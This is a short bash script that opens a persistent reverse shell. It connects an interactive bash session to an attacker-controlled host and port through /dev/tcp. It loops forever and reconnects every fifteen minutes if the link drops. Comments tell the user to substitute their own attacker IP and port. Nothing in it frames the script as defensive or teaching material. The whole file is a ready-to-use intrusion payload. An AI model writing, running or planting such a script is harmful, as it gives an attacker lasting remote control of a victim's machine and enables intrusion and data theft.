#!/bin/bash

# IP and port of the attacker's machine
HOST="10.0.2.15"  # Replace with your attacker's IP
PORT=5555         # Replace with your attacker's port

# Infinite loop to keep trying to connect
while true; do
    # Create a reverse shell connection
    /bin/bash -i >& /dev/tcp/$HOST/$PORT 0>&1
    sleep 900  # Wait for 15 minutes (900 seconds) before retrying if the connection fails or is closed on accident
done